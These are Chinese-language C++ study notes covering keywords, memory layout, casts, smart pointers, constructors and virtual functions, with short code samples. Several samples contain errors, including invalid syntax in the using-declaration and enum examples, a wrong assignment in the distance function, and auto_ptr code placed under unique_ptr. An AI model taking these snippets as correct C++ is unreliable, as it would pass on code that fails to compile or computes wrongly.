## 📚C++

### 🏷const

**作用**

1、修饰变量，说明该变量不可以被改变

2、修饰指针，分为指向常量的指针（pointer to const 如：const int * p ）const在 * 之前，不能通过 * P来修改所指向的内容去的内容；常量指针，简称常指针：int * const p, * 在const之前，不能改变指向的位置

```c++
char g[] = "hello";
const char* p1 = g;  //指针变量，不能通过*p1 改变内容，可以改变位置
char * const p2 = g;  //常量指针，不能改变指针指向的位置；可以改变内容
```

3、修饰引用，指向常量的应用，用于形参类型，避免了拷贝，又避免了函数对值得修改；

```c++
void function(const int& var);
```

4、修饰成员函数，该成员函数内不能改变成员变量。

```c++
class A{
 int func() const; 
}
```

### 🏷 static

| static作用       | 存储区 | 初始化     | 作用域                                                       | 备注                                                         |
| ---------------- | ------ | ---------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 定义全局静态变量 | 静态区 | 默认初始化 | 仅在声明它的文件中可见，不被其他文件所用                     | 在main函数执行前就分配了空间                                 |
| 局部静态变量     | 静态区 | 默认初始化 | 局部作用域                                                   | 当执行离开局部作用域后，该变量没有被销毁，任然驻留在内存中。 |
| 静态函数         |        |            | 仅在声明它的文件中可见，不被其他文件所用                     | 不要在头文件中声明static的全局函数，<br />不要在cpp内声明非static的全局函数.<br />如果要在多个cpp中重复使用该函数，就把它声明到头文件中<br />否则cpp内部声明应该加上static修饰 |
| 类的静态成员     |        |            |                                                              | 静态成员是类的所有对象中共享的成员，而不是某个对象的成员.<br />静态数据成员只存储一处，对所有对象共用。 |
| 类的静态函数     |        |            | 静态函数与静态成员一样，<br />不是对象成员，引用时不需要对象名 | 引用格式：<类名>::<静态成员函数名>(<参数>);                  |

### 🏷 extern

1、可以置于变量或者函数前，以声明变量或者函数的定义在别的文件中，提示编译器在遇到次变量和函数时在其他模块中寻找其定义

2、链接指定，当他和"C"一起连用时，`extern "c" void fun(int a, int b)`;这 告诉编译器在编译这个fun按照c的规则去翻译函数名

与include相比，extern引用另一个文件的范围小，include可以引用另一个文件的全部内容

### 🏷 explicit关键字

C++中的explicit关键字只能修饰只有一个参数的类构造函数，作用是表名该构造函数是显示的，而非隐式的，跟它对应的另一关键字是implicit，意思是隐藏的，类的构造函数默认下即声明为implicit

参考https://blog.csdn.net/guoyunfei123/article/details/89003369

### 🏷this指针

1、`this` 指针是一个隐含于每一个非静态成员函数中的特殊指针。它指向调用该成员函数的那个对象

2、当对一个对象调用成员函数时，编译程序先将对象的地址赋值给 `this` 指针，然后调用成员函数，每次成员函数存取数据成员时，都隐式的使用 `this` 指针。

3、当一个成员函数被调用时，自动向它传递一个隐含的参数，该参数指向这个成员函数所在对象的指针。

4、`this` 指针被隐含的声明为： `ClassName *const this` ,这意味着不能给 `this` 指针赋值；在 `ClassName` 类的 `const` 成员中， `this` 指针的类型为 `const ClassName* const` ,这说明不能对 `this` 指针所指向的这种对象是不可修改的

5、 `this` 并不是常规变量，而是个右值，所以不能取得 `this` 的地址（不能 `&this` )

6、在以下场景中，经常需要显示的应用 `this` 指针：

​	1、为实现对象的链式引用；

​	2、为了避免对同一对象进行赋值操作；

​	3、实现一些数据结构时，如：list

### 🏷 inline 内联函数

* 相当于把内联函数里的内容写在调用内联函数处
* 相当于不用执行进入函数的步骤，直接执行函数体；
* 相当于宏，却比宏多了类型检查，真正具有函数特性；
* 内联一般不包含循环、递归等复杂操作
* 在类声明中定义的函数，除了虚函数其他函数都会自动隐式地当成内联函数。

####  编译器对inline函数的处理步骤

1、将inline函数体复制到inline函数调用点处；

2、为所用inline函数中的局部变量分配内存空间；

3、将inline函数的输入参数和返回值映射到调用方法的局部变量空间中；

4、如果inline函数有多个返回点，将其转变为inline函数代码块末尾的分支（使GOTO）

#### 优缺点

**优点**

1、内联函数和宏函数一样将在被调用处进行代码展开，省去了参数压栈，栈帧开辟与回收，结果返回等，从而提高程序的运行速度；

2、内联函数相比宏函数来说，在代码展开时，会做安全检查或自动类型转换，而宏定义不会；

3、在类中声明的同时定义的成员函数，会自动转化为内联函数，因此内联函数可以访问类的成员变量，宏定义不行

4、内联函数在运行时可以调试，而宏定义不可以

**缺点**

1、代码膨胀💥。内联是一代码膨胀为代价，消除函数调用带来的开销。

2、inline函数无法随着函数库升级而升级。inline函数的改变需要重新编译，不行on-inline可以直接链接

**[内联函数与宏定义的区别？](https://www.cnblogs.com/chengxuyuancc/archive/2013/04/04/2999844.html)**

内联函数是代码被插入到调用者代码处的函数。如同#define宏，内联函数通过避免被调用的开销来提高执行效率，尤其是它能够通过调用（“过程化集成”）被编译期优化。

宏定义不检查函数参数，返回值什么的，只是展开，相对来说内联函数会检查参数类型，所以更安全。

#### 虚函数（virtual）可以是内联函数吗？

* 虚函数可以是内联函数，内联可以修饰虚函数的，但是当虚函数表现多态性时不能内联
* 内联是在编译期内联，而虚函数的多态性是在运行期。编译器无法知道运行期调用哪个代码，因此虚函数表现为多态性时不可内联。
*  `inline virtual`  唯一内联的时候是：编译器知道调用的对象是哪个类 （如 `Base::who()` ,这只有在编译器具有实际对象而不是对象的指针或引用时才会发生。

``` c++
#include<iostream>
using namespace std;
class Base
{
  public:
    inline virtual void who()
    {
      cout << "kkk\n";
    }
    virtual ~Base(){}
};
class Derived : public Base
{
  public:
    inline void who()  // 不写inline时隐式内联
    {
      cout << "kkk";
    }
};
int main()
{
  Base b;
  b.who();  // 此处的虚函数是who()，是通过类Base的具体对象b来调用，编译器就能确定了
  
  // 此处的虚函数是通过指针调用的，呈多态性，需要在运行时期才能确定，所以不能内联
  Base* ptr = new Derived();
  ptr->who();
  return 0;
}
```

### 🏷 assert()

断言，是宏，而非函数。assert宏的原型定义在 `<assert.h>` c语言 -- `<cassert>` C++

 作用：如果他的条件返回错误，则终止程序执行。可以通过定义 `NOEBUG` 来关闭，需要定义在 `include<assert.h>`  之前 

```c++
#define NDEBUG
#include<assert.h>
assert(p != nullptr);
```

### 🏷 sizeof()

* sizeof对数组，得到整个数组占空间大小

* sizeof对指针，得到指针本身大小，32位指针4字节，64位8字节

  ​	sizefof(空类) = 1；[类的大小——sizeof 的研究(1)](https://www.jianshu.com/p/5163a2678171)

  ​	因为一个空类也要实例化，所谓类的实例化就是在内存中分配一块地址，每个实例在内存中都有独一无二的的地址。同样空类也会被实例化
  
  **对类进行sizeof()**
  
  成员需要内存对齐
  
  静态成员不占内存
  
  成员函数不占内存
  
  虚函数指针占一个指针空间（不管多少个虚函数）

### 🏷 C/C++程序内存存储区域

1、**内存栈区**：存放函数参数，函数返回地址，函数内部变量，函数一些寄存器（由编译器自动分配释放）

2、**内存堆区**：存放new或malloc出来的对象（程序员分配释放）

3、**常数区**：存放局部常量和全局常量的值，函数指针

4、**静态区**：存放全局变量或者静态变量，虚函数表

5、**代码区**：二级制代码

c/c++不提供垃圾回收机制，因此需要对堆中的数据进行及时的销毁，防止内存泄漏，使用 `free, delete` 



### 🏷 野指针与悬空指针

野指针：wild pointer没有经过初始化的指针

悬空指针：最初指向的内存已经被释放了的指针

**危害** ：无论是野指针还是悬空指针，都是 *指向无效内存区域的指针*。访问“不安全可控”（invalid）的内存区域 <font color="red">导致“Undefined Behavior</font> 

#### 内存泄漏

简单地说就是申请了一块内存空间，使用完毕后没有释放掉。它的一般表现方式是程序运行时间越长，占用内存越多，最终用尽全部内存，整个系统崩溃。

由程序申请一块内存，没有指针指向它，那么这块内存就泄漏了

**如何避免内存泄漏**;

1、良好的编码习惯

2、MAT工具监测

### 🏷 new/malloc和free/delete

**首先 new对应的是delete-C++中使用， malloc对应free- c语言使用。free用来释放malloc出来的动态空间，delete用来释放new出来的空间**

**new与malloc区别**

1、new 和malloc都是在堆上开辟内存的

​	malloc只负责开辟内存，没有初始化功能，需要用户自己初始化；new 不但可以开辟内存，还可以进行初始化。

2、malloc是函数，开辟内存需要传入字节数，如 `malloc(100)` 表示在堆上开辟了100个字节的内存，返回void *，表示分配的堆内存的起始位置，因此malloc的返回值需要强制转换为所需类型；new是运算符，开辟的内存需要指定类型，返回指定类型的地址，无需强转

3、 malloc开辟内存失败返回NULL，new 开辟失败返回bad_alloc类型的异常，需要捕获异常才能判断内存是否开辟成功，new 运算符其实operator new 函数的调用，它的底层也是malloc来开辟内存，new它比malloc多的功能就是初始化功能，对应类型来说，就是调用构造函数

4、malloc用free释放，new用delete释放

#### malloc、calloc、realloc、alloca

1、malloc：申请指定字节数内存。申请到的内存中的初始值不确定

2、calloc：为指定长度的对象，分配能够容纳指定个数的内存。申请到的内存的每一bit都初始化为0

3、realloc：更改以前分配的内存长度（增加或减少）。当增加长度时，可能需将以前分配区的内容移动另一个足够大的区域，而新增区域内的初始化值则不确定

4、alloca：在栈上申请内存。程序在出栈的时候，会自动释放内存。但是需要注意的是，alloca不具备可移植性。

### linux环境内存分配原理 malloc info

[linux环境内存分配原理 malloc info](https://www.cnblogs.com/dongzhiquan/p/5621906.html)

### 系统调用和库函数的区别

[系统调用和库函数的区别](https://cloud.tencent.com/developer/article/1497773)

### 🏷 #pragma pack(n)

为什么要进行内存对齐？

尽管内存是以字节为单位，但是到部分处理器并不是按字节块来存取内存的，它一般会以双字节，4字节，8字节，16，甚至32字节来存取内存（内存存取粒度）

假如没有内存对齐机制，数据可以任意存放，现在一个int变量存放在从地址1开始的连续四个字节地址中，该处理器去取数据时，要先从0地址开始读取第一个4字节块,剔除不想要的字节（0地址）,然后从地址4开始读取下一个4字节块,同样剔除不要的数据（5，6，7地址）,最后留下的两块数据合并放入寄存器.这需要做很多工作.

```c
//32位系统
#include<stdio.h>
struct
{
    int i;    
    char c1;  
    char c2;  
}x1;

struct{
    char c1;  
    int i;    
    char c2;  
}x2;

struct{
    char c1;  
    char c2; 
    int i;    
}x3;

int main()
{
    printf("%d\n",sizeof(x1));  // 输出8
    printf("%d\n",sizeof(x2));  // 输出12
    printf("%d\n",sizeof(x3));  // 输出8
    return 0;
}
```

设定结构体、联合体以及类成员变量以n字节方式对齐

```c++
#pragma pack(push) //保存对齐状态
#pragma pack(4)  //设定为4字节对齐
static test
{
  char m1;
  double m4;
  int m3;
};
#pragma pack(pop)  // 恢复对齐状态 
```

### 🏷C++ --堆和栈详解

[C++ 栈和堆的区别](https://www.cnblogs.com/lxmhhy/p/3559212.html)

https://blog.csdn.net/wo17fang/article/details/52244238

**内存分配方面**：

堆：操作系统有一个记录空闲内存地址的链表，当系统受到程序的申请时，会遍历该链表，寻找第一个空间大于所申请空间的堆节点，然后将该节点从空闲节点链表中删除，并将该节点分配给程序，另外，对于大多数系统，会在这块内存空间中的首地址处记录本次分配的大小，这样代码中的delete语句才能正确的释放本内存空间。我们常说的内存泄漏，最常见的就是堆泄漏

栈：

**程序的内存分配：**

### 🏷 c与C++区别

设计思想上:

C++是面向对象的语言，而C是面向过程的结构化编程语言

语法上：

C++具有封装、继承、多态性

C++与C相比，增加了许多类型安全功能，比如强制类型转换

C++支持范式编程，如模板类，函数模板等

封装：

封装就是将抽象得到的数据和行为（或功能）相结合，形成一个有机的整体，也就是将数据与操作数据的源代码进行有机的结合，形成“类”，其中数据和函数都是类的成员。

### 🏷 cast转换

C++中四种类型转换： [原文](https://www.jianshu.com/p/5163a2678171)

1、const_cast

格式：`const int b = 0; int * p = const_cast<int* > (&b);`

用于将const变量转为非const

2、static_cast

static_cast的转换格式： `static_cast <type-id> (expression)`

a. 基本数据类型之间的转换，如int 转char

举例：

```c++
short value = 64;
int val = static_cast<int> (value);
// short是2个字节，int是4个字节，将short转成int之后，高位根据符号位补满
```

b. 用于类层次结构中，基类和子类之间的指针和引用的转换

> 当进行上行转换，子类的指针或引用转成父类表示，这是安全的
>
> 当进行下行转换，父类的指针或引用转成子类表示，这是不安全的，需要程序员保证

c. 用于各种隐式转换，比如非const转const, void*转指针等。

3、dynamic_cast

用于动态类型转换。只能用于含有虚函数的类，用于类层次间的向上或向下转换。只能转指针或引用。向下转化时，如果是非法的对于指针返回NULL，对于引用抛出异常

它通过判断在执行到该语句的时候变量的运行时类型和要转换的类型是否相同来判断是否能够进行转换

4、reinterpret_cast

几乎什么都可转，比如int转指针

### 🏷 指针与引用

1、指针有自己的一块空间，而引用只是一个别名

2、使用sizeof看，一个指针的大小是4，而引用则是被引用对象的大小

3、指针可以被初始化为NULL，而引用必须被初始化一个已有对象的引用

4、作为参数传递时，指针需要被解引用才可以进行对对象的操作，而直接对引用的修改会改变引用指向的对象；

5、指针在使用中可以指向其他的对象，但是引用只能对一个对象的引用

6、指针可以有多级指针（** p) ，而引用只有一级

7、指针和引用使用++运算符的意义不一样

8、如果返回多态内存分配对象或内存，必须使用指针，引用可能引起内存泄漏

### 🏷 C++中struct和class

总的来说，struct更适合看做一个数据结构的实体，class更适合看成一个对象的实体

在C++中可以使用struct和class定义类，都可以继承。

区别在于:struct的默认继承权限和默认访问权限是public；

class的默认继承权限和默认访问权限是private

另外， class还可以定义模板类形参，如 `template<class T, int i>`

### 🏷 C++中的类默认函数与default关键字和delete关键字

[原文](https://blog.csdn.net/u012333003/article/details/25299939)

1. 类中默认的成员函数
   * 默认构造函数
   * 析构函数
   * 拷贝构造函数
   * 拷贝赋值函数
   * 移动构造函数（c++11）
   * 移动拷贝函数
2. 类中自定义的操作符函数
   * operator
   * operator&
   * operator&&
   * operator*
   * operator->
   * operator->*
   * operator new
   * operator delete

一旦程序员实现了这些函数的自定义版本，则编译器不在自动生成默认版本。

```c++
class Mc
{
  public:
  	Mc() = default;
  	Mc(int i):data(i){};
  private:
  	int data;
}
```

当我们仅创建了有参构造函数后，如果想调用无参构造函数编译保存。因为一旦定义了有参构造函数，默认的构造函数会被屏蔽。

**C++11中可以通过default关键字让默认构造函数恢复**

#### C++新特性-移动构造函数和移动赋值

##### 移动构造函数

[C++11新特性（50）- 移动构造函数和移动赋值](https://blog.csdn.net/craftsman1970/article/details/81087262)

```c++
//拷贝构造函数
Tracer(Tracer& t)
{
  if (t.text != nullptr){
    int len = strlen(t.text);
    text = new char[len+1];
    strcpy(text, t.text);
  }
}
//拷贝构造函数中实现了深拷贝处理。
//移动构造函数
Tracer(Tracer&& t)
{
  if (t.text != nullptr){
    text = t.text;
    t.text = nullptr;
  }
}
```

代码构造和拷贝构造函数类似，但是内存的处理不是拷贝而是转移。注意参数类型是右值引用。





### 🏷 类对象占用内存空间大小

[原文](https://blog.csdn.net/baidu_35679960/article/details/79487478)

首先，平时所声明的类只是一种类型定义，它本身没有大小可言，因此，如果用sizeof运算符对一个类型名操作，那得到的是具有该类型实体的大小。

> 类所占内存的大小是由成员变量（静态变量除外）决定的，成员函数是不计算在内的。
>
> 成员函数还是以一般的函数一样存在。a.fun()通过fun(a.this)来调用的。所谓成员函数只是名义上是类里的。其实成员函数的大小不在类对象里面。同一个类的多个对象共享函数代码。而我们访问类的成员函数是通过类里面的指针实现。

<font color="red">父类子类共享一个虚函数指针</font>

空的类是会占用内存空间的，而且大小是1，原因是C++要求每个实例在内存中都有独一无二的地址，

1. 类内部的成员变量

   普通的变量：是要占用内存的，但是要注意对齐原则

   static修饰的静态变量：不占用内存，原因是编译期将其放在全局变量区

2. 类内部的成员函数

   普通函数：不占用内存

   虚函数：要占用4个字节，用来指定虚函数的虚函数表的入口地址。所以一个类的虚函数占用的地址是不变的，和虚函数个数没有关系的。
   
   注意虚函数指针（32为占4字节，64占8字节）

### 🏷 类成员的访问权限

1、public：类中、类外可以访问

2、protected：子类，以及本类所访问

3、private：成员函数可以访问，友元类或友元函数访问

### 🏷 union联合

union是一种节省空间的特殊的类，一个union可以有多个数据成员，但是对外只表示一个数据成员。当某个数据成员被赋值后其他成员变成未定义状态。联合特点

* 默认访问控制符是public
* 可以包含构造函数、析构函数
* 不能含有引用类型的成员
* 不能继承、和被继承
* 匿名union在定义所在作用域可以直接访问成员
* 不能包含protected和private成员
* 全局匿名联合必须是静态（static）的

```c++
#include<iostream>
union UnionTest{
  UnionTest():i(10){};
  int i;
  double d;
};

static union{
  int i;
  double d;
};
int main()
{
  UnionTest u;
  union {
    int i;
    double d;
  };
  std::cout << u.i << std::endl; // 输出UnionTest的10
  ::i = 20;
  std::cout << ::i << std::endl; //输出全局静态匿名联合20
  i= 30;
  std::cout << i << std::endl;  //30
  return 0;
}
```

### 🏷 友元

友元关系不具有对称性。即A是B的友元，但B不一定是A的友元。友元关系也不具有传递性，即B是A的友元，C是B的友元，但C不一定是A的友元

#### 友元函数

特点：友元函数是能够访问类中的私有成员的非成员函数。友元与普通函数一样，即在定义上和调用上与普通函数一样。

```c++
#include<iostream>
#include<cmath>
using namespace std;
class Point
{
  public:
    Point(double xx, double yy)
    {
      x = xx;
      y = yy;
    }
  void Getxy();
  friend double Distance(Point &a, Point &b);
  private:
    double x, y;
};
void Point::Getxy()
{
  cout<<x<<y<<endl;
}
double Distance(Point &a, Point &b)
{
  double dx = a.x - b.x;
  double dy = a.y = b.y;
  return sqrt(dx*dx + dy*dy);
}

int main(void)
{
  Point P1(3.0, 4.0), p2(6.0, 8.0);
  double d = Distance(p1, p2);
  cout << d;
  return 0;
}
```

在该程序中的Point类中声明了一个友元函数Distance()，函数名前加friend关键字。但是他的定义与普通函数是一样的，不需要指出所属类，但是它可以引用类中的私有成员。

#### 友元类

定义：友元除了函数以为，还可以是类，即一个类作为另一个类的友元。当一个类作为另一个类的友元时，这就意味着这个类的所有成员函数都是另一个类的友元函数，都可以访问另一个类的隐藏信息（包括私有成员和保护成员）

### 🏷 using 

**using 声明**：

一条 `using声明` 语句一次只能引入命名空间的一个成员。它使得我们可以清楚知道程序中所引用的到底是哪个名字， 如 `using namespace_name::name`

**构造函数的using声明**

在C++11 中，派生类能够重用其直接基类定义的构造函数

```c++
class Derived::Base
{
  public:
    using Base:base;
};
```

如上using声明，对应基类的每个构造函数，编译器都生成一个与之对应（形参列表完全相同）的派生类构造函。生成如下类型构造函数：

```c++
Derived(parms) : Base(args){}
```

**using指示**

使得某个特定的命名空间中所有名字都可见，这样我们无需再为它们添加任何前缀限定符了。

```c++
using namespace std;
```

尽量少使用using指示污染命名空间

> 一般，使用using命令比使用using编译命令更安全，这是由于它只导入了指定的名称。如果该名称与局部名称发送冲突，编译器会发出提示。using编译命令导入所有的名称，包括可能并不使用的名称。如果与局部名称发生冲突，则局部名称将覆盖名称空间版本，而编译器不会发出警告 。另外，名称空间的开放性意味着名称空间的名称可能分散在多个地方，这使得难以准确地知道添加了哪些名称。

少使用using指示

```c++
using namespace std;
```

多使用using声明

```c++
int x;
std::cin >> x;
```

或者

```c++
using std::cin;
using std::cout;
using std::endl;
int x;
cin >>x;
cout <<x<<endl;
```

### 🏷 :: 范围解析运算符

**分类**

1、全局作用域符(::name)：用于类型名称（类，类成员、成员函数、变量等），表示作用域为全局命名空间

2、类作用域（class::name) : 用于表示指定类作用域范围是具体某个类

3、命名空间作用域符（namespace::name)：用于表示指定类型的作用域范围是具体某个命名空间

```c++
int count = 11;  
class A{
  public: static int count;
};
int A::count = 21;
void fun()
{
  int count = 31;
  count = 32;
}

int main()
{
  cout<<::count;  //11
  A::count;  //21
  return 0;
}
```

### 🏷 enum枚举类型

限定作用域的枚举类型

```c++
enum class ioen{input, output, apppend};
```

不限定作用域的枚举类型

```c++
enum color (red, yellow, green);
enum {floatPrec = 6, doublePrec = 10};
```

### 🏷 decltype

作用于检查实体的声明类型或表达式的类型以及值分类

```c++
//尾置返回允许我们在参数列表之后声明返回类型
template<typename It>
auto fun(It beg, It end)->decltype(*beg)
{
  //处理序列
  return *beg; //返回序列中的一个元素的引用
}
//为了使用模板参数成员必须使用typename
template<typename It>
auto f(It beg, It end)->typename remove_reference<decltype(*beg)>>::type
{
  return *beg;  // 返回一个元素的拷贝
}
```

### 🏷 引用-左值引用-右值引用

右值引用是C++11中引入的新特性，它实现了转移语义和精确传递。它的主要目的有两个方面：

1、消除两个对象交互时不必要的对象拷贝，节省运算存储资源，提高效率

2、能够更简洁明确地定义泛型函数。

右值：当一个对象被当做右值时，用的是对象的内容，**右值要么是字面常量，要么是在表达式求值过程中创建的对象。不能对表达式取地址，或匿名对象。一般指表达式结束就不存在的临时对象**

左值：能对表达式取地址，或具名对象/变量。一般指表达式结束后依然存在的持久对象。

右值引用（&&）

左值引用（&）

```c++
int i = 32;
int &r = i;             //正确，r引用i
int &&rr = i;           //错误，不能将一个右值引用到左值上
int &r2 = i*32;         //错误，i*32是一个右值
const int &r3 = i*32;   //正确，可以将一个const引用绑定到一个右值上
int &&r4 = i*32;       //正确，将r4绑定到右值
```

### 🏷 数组

**一维数组**

```c++
int *t = new int[10];
delete [] t;
```



#### 二维动态数组的申请与释放

```c
size_t row, col;
cin >> row >> col;
int **Table = new int*[row];
for (int i = 0; i < row; i++)
    Table[i] = new int[col];
// 释放
for (int i = 0; i < row; i++)
    delete[] Table[i];
delete[] Table;
```

### 🏷 智能指针

智能指针的作用是管理一个指针，解决因申请空间而忘记释放，造成内存泄漏的问题。

因为智能指针是一个类，当超出类的作用域时，类会自动调用析构函数，释放资源。不需要手动释放

1、auto_ptr(C++98的方案，cpp11弃用)

采用所有权模式。

```c++
auto_ptr<string> p1 (new string ("safasdf"));
auto_ptr<string> p2;
p2 = p1; // 不会报错
```

此时p2剥夺了p1的所有权，但是当程序运行时访问p1会报错。所以存在内存崩溃的问题。

2、unique_ptr（替换auto_ptr)

unique采用独占式拥有或严格拥有概念，保证同一时间内只有一个智能指针可以指向该对象，它对于避免资源协议特别有用

```c++
auto_ptr<string> p1 (new string ("safasdf"));
auto_ptr<string> p2;
p2 = p1; // 会报错
```

另外unique_ptr还有更聪明的地方，当程序试图将一个unique_ptr赋值给另一个是，如果员unique_ptr是一个临时右值，则允许这么做。如果原unique_ptr存在一段时间，编译器禁止

```c++  
unique_ptr<string> p1 (new string("adf"));
unique_ptr<string p2;
p2 = p1;   //not allowed
unique_ptr<string> p3;
p3 = unique_ptr<string>(new string("sdf"));   //allowed
```

3、shared_ptr

实现共享式坐拥。多个智能指针可以指向相同对象，该对象和其相关资源会在”最后一个引用被销毁时“释放。它使用计数机制来表明资源被几个指针共享。可以通过成员函数use_count()来查看资源的所有者个数。除了可以通过new来构造，还可以通过传入auto_ptr, unique_ptr, weak_ptr来构造。当我们调用release()时，当前指针会释放资源所有权，计数器减一，当计数器等于0时，资源被释放

Share_ptr是为了解决auto_ptr在对象所有权上的局限性

[shared__ptr是否是线程安全的](https://beamnote.com/2014/is-shared-ptr-thread-safe/)

[**C++ 动手实现一个shared_ptr**](http://blog.leanote.com/post/shijiaxin.cn@gmail.com/C-shared_ptr)

**成员函数**：

use_count返回引用计数个数

unique返回是否独占所有权（use_count=1)

swap交换两个shared_ptr对象

reset释放内部对象的所有权或拥有对象的变更，会引起原有对象的引用计数的减少

get返回内部对象（指针）。

4、weak_ptr

是一个不控制对象生命周期的智能指针。指向一个shared_ptr管理的对象，进行该对象的内存管理的是那个shared_ptr，weak_ptr只是提供对管理对象的一个访问手段。weak_ptr设计的目的是为了配合shared_ptr工作。它只可以从一个shared_ptr或另一个weak_ptr对象构造，它的构造和析构都不会引起计数的变化。

weak_ptr是用来解决shared_ptr相互引用引起的死锁问题。如果两个shared_ptr指针相互引用，那么两个指针的引用计数永不归零，资源永不释放。它是对对象的一种若引用。

```c++
class B;
class A
{
  public:
      shared_ptr<B> pb_;
      ~A();
};
class B
{
  public:
      shared_ptr<A> pa_;
      ~B();
};
void func()
{
  shared_ptr<B> pb(new B());
  shared_ptr<A> pa(new A());
  pb->pa_ = pa;
  pa->pb_ = pb;
}
int main()
{
  fun();
  return 0;
}
```

fun中pa,pb相互引用

### 🏷 拷贝构造函数的作用以及用途？

 **拷贝构造函数的作用以及用途？什么时候需要自定义拷贝构造函数？**

1. 在c++中，有下面三种对象需要拷贝的情况：

   * 一个对象以值传递的方式传入函数体
   * 一个对象以值传递的方式从函数返回
   * 一个对象需要通过另一个对象进行初始化

   以上情况就需要拷贝构造函数的调用

2. 当类中的数据成员需要动态分配内存空间时，不可以依赖默认的拷贝构造函数。当默认拷贝构造函数被编译期需要而合成时，将执行default memberwise copy语义。

**构造函数可以调用虚函数吗？语法上通过吗？语义上通过吗？**

不能，语法上通过，语义上有问题

derived class(派生类)对象内的base class成分会在derived class 自身构造之前构造完毕。因此，在base class的构造函数中执行virtural函数将会是base class的版本，绝不会是derived class 的版本、

### 🏷 函数指针

定义：函数指针是指向函数的指针变量

函数指针本身首先是一个指针变量，该指针变量指向一个具体的函数。这正如指针变量可指向整型变量、字符型、数组一样。

C 在编译时，每一个函数都有一个入口地址，该入口地址就是函数指针指向的地址，有了指向函数的指针变量后，可用该指针变量调用函数，就如同指针变量可引用其他类型变量一样。

用途：调用函数和做函数的参数，比如回调函数

示例：

```c++
char *fun(char *p){}  //函数  返回的是一个char *指针
char *(*pf)(char *p); // 函数指针pf
pf = fun;   //函数指针pf指向函数fun
```

### 🏷 面向对象三大特征

#### 封装

把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或对象操作，对不可信的进行隐藏

#### 继承

派生类继承基类

#### **多态**

消息以多种形式展现的能力

多态是以封装和继承为基础的

C++多态分类以及实现：

> 1、重载多态（编译期，静态多态）：函数重载，运算符重载
>
> 2、子类型多态（运行期，动态多态）：虚函数
>
> 3、参数多态性（编译期，静态多态）：类模板，函数模板
>
> 4、强制多态（运行期，动态）：基本类型转换，自定义类型转换

### 🏷 不能被继承的类

一个类不能被继承，也就是说它的子类不能构造父类，这样的子类就不能实例化这个子类，从而实现子类无法继承父类

我们可以将一类的构造函数声明为私有，使得这个类的构造函数对子类不可见，那么这个类就不能被继承了。

但是这样也引出了一个问题。客户程序也无法实例化这个类的实例。

**参考单例模式，用一个static函数来帮助创建这个类的实例**

```c++
class Cparent
{
  private:
      Cparent(int v){m_v = v};
  		~Cparent(){};
      int m_v;
      static Cparent *m_instance;
  public:
      static Cparent* getInstance(int v)
      {
        m_instance = new Cparent(v);
        return m_instance;
      }
};
```

**c++11 的新关键字final**

```c++
class B final{
    public:
    B(int a)
    {}
};
```

### 🏷拷贝构造函数与赋值运算符

[C++ 拷贝构造函数和赋值运算符](https://www.cnblogs.com/wangguchangqing/p/6141743.html)

在默认情况下（用户没有定义，但是也没有显示的删除），编译期会自动的隐式的生成一个拷贝构造函数和赋值运算符。但是用户可以使用`delete`来指定不生成这两个函数。

```c++
class Person
{
public:
    Person(const Person& p) = delete;
    Person& operator=(const Person& p) = delete;
}
```

**拷贝构造函数必须以引用的方式传递参数**。这是因为，在值传递的方式传递一个函数时，会调用拷贝构造函数生成函数的实参。如果拷贝构造函数的参数任然是以值的方式，则就会无限循环的调用下去，直到栈的溢出。

```c
class Person
{
public:
    Person(const Person& p)  //拷贝构造
    {
        ptr = new int;
        *ptr = *(p.ptr);
    }
    Person& operator=(const Person& p)
    {
        delete ptr;
        ptr = new int;
        *ptr = *(p.ptr);
        return *this;
	}
private:
    int *ptr;
}
```

**何时调用？**

拷贝构造函数和赋值运算符的行为比较相似，都是将一个对象的值复制给另一个对象；但是结果却有些不同，拷贝构造函数使用传入的值生成一个新的对象的实例，而复制运算符是将对象的值复制给一个已经存在的对象实例。

<font color="red">调用的是拷贝构造函数还是赋值运算符，主要是看是否有新的对象实例产生。</font>

#### 浅拷贝与深拷贝

浅拷贝：当类数据成员有指针时，浅拷贝只是单纯的将一个指针的地址赋值给另一个类成员指针。这样会有问题，当其中一个析构了该地址，那么另外一个也没有了。

深拷贝：他会重新申请一个区域来存放，被复制的指针所指向的值。两个东西完全独立。

```c++
#include <iostream>

using namespace std;

class Person
{
private:
    int *ptr;
public:
    Person(int t){
        ptr = new int;
        *ptr = t;
    }
    Person(const Person& p){
        ptr = new int;
        *ptr = *p.ptr;
    }
    Person& operator = (const Person& p){
        ptr = new int;  // 深拷贝
        *ptr = *p.ptr;  // 浅拷贝   删除ptr=p.ptr;  两个指针指向同一位置。
        return *this;
    }
    void printPer(){
        cout << *ptr << endl;
    }
    void change(int i){
        *ptr = i;
    }
    ~Person(){
        delete ptr;
    }
};

int main()
{
    int i = 10;
    Person p(i);
    p.printPer();
    Person p1(1000);
    p1.printPer();
    p = p1;
    p1.change(999);
    p.printPer();

}
```



### 🏷 析构函数

析构函数与构造函数对应，当对象结束其生命周期，如对象所在的函数已调用完毕时，系统会自动执行析构函数。

析构函数名也对应与 `~类名` 。它不能带任何参数，没有返回值（包括void）。只能有一个析构函数，不能重载。

如果用户没有编写析构函数，编译系统会自动生成一个省缺的析构函数（即使自定义了析构函数，编译器也总会为我们合成一个析构函数，编译器在执行的时候会先调用自定义的析构函数，再调用合成的析构函数），它也不进行任何的操作。许多简单的类中没有用显式的析构函数。

类析构顺序：1）派生类本身的析构函数，2）对象成员的析构函数，3）基类的析构函数。

### 🏷 虚函数virtual、纯虚函数

* 类如果声明了虚函数，这个函数是实现的，哪怕是空实现，它的作业就是为了能让这个函数在它的子类可以被覆盖，这样的话，编译器就可以使用后期绑定来达到多态。纯虚函数只是一个接口，是个函数声明而已，它要留到子类去实现。
* 虚函数在子类里可以不重写，但是纯虚函数必须在子类中实现才可以实例化子类
* 虚函数的类用作与”实作继承“，继承接口同时也继承了父类的实现。纯虚函数关注的是接口的统一性，实现由子类完成
* 带有纯虚函数的类叫做抽象类，这种类不能直接生成对象，而且只能被继承，并且需重写其虚函数后，才能使用。
* 虚基类是虚继承中的记录

虚函数使用场景**：

使用一个基类指针指向一个派生类，基类指针只能用基类方法

换句话说，通过基类指针只能访问派生类的成员变量，不能访问派生类的方法

为了消除这种尴尬，让基类指针能够访问派生类的成员数据，C++增加了虚函数

**注意**：

* 带纯虚函数的类不能被实例化

* 构造函数不能是虚构函数，创建派生类的时候要调用派生类的构造函数，派生类的构造函数不能继承基类的构造函数
* 析构函数应该是虚函数，除非类不用做基类，默认的析构函数不能是虚函数
